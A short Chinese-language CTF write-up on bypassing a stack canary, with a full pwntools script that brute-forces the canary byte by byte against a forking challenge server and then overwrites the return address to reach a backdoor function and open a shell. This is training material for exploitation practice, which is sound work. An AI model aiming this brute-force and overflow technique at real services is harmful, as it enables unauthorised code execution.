# 挑战简介
Bypass Canary 姿势5

# 思路
思路利用了爆破，由于此题利用了fork创建子进程，所以canary每次连接时都会随机，因此只能利用爆破

爆破就是将所有字符与canary每个字符进行对比，匹配则加上并进行下一个字节对比，以此来推出canary

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28192)

elf = ELF('D:\edge 下载\pwn')

backdoor = elf.sym['backdoor']

canary = '\x00'

for i in range(3):
    for j in range(0, 256):
        print("idx: " + str(i) + ": " + chr(j))
        payload = 'a' * (0x70 - 0xC) + canary + chr(j)
        io.send(payload)
        sleep(0.3)
        text = io.recv()
        print(text)
        if(b"stack smashing detected" not in text):
            canary += chr(j)
            print("canary: " + canary)
            break

print('Canary:' + hex(u32(canary)))

# 将canary转换为bytes形式
canary_bytes = canary.encode('latin-1')  # 将字符串转换为字节串
payload = b'a' * (0x70 - 0xC) + canary_bytes + b'a' * 0xc + p32(backdoor)

io.send(payload)
io.recv()
io.interactive()
```
